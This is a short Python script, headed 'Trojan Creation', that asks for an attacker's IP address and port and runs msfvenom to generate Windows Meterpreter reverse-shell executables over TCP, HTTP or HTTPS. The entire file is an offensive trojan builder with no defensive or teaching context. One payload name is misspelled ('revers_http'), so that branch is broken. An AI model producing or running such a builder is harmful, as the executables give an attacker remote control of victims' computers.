#!/usr/bin/env python
# -*- coding: utf-8 -*-

import os

os.system("apt-get install figlet")
os.system("clear")
os.system("figlet Trojan Creation")

ip = raw_input("Enter Local or Public IP: ")
port = raw_input("Port: ")
print(""" 
1) windows/meterpreter/reverse_tcp
2) windows/meterpreter/reverse_http
3) windows/meterpreter/reverse_https
""")
payload = raw_input("Payload No: ")
regpath = raw_input("Registration Path: ")

if (payload == "1"):
	os.system("msfvenom -p windows/meterpreter/reverse_tcp LHOST=" + ip + " LPORT=" + port + " -f exe -o " + regpath)
	
elif (payload == "2"):
	os.system("msfvenom -p windows/meterpreter/revers_http LHOST=" + ip + " LPORT=" + port + " -f exe -o " + regpath)

elif (payload == "3"):
	os.system("msfvenom -p windows/meterpreter/reverse_https LHOST=" + ip + " LPORT=" + port + " -f exe -o " + regpath)
	
else:
	print("Wrong choice. The program is closing")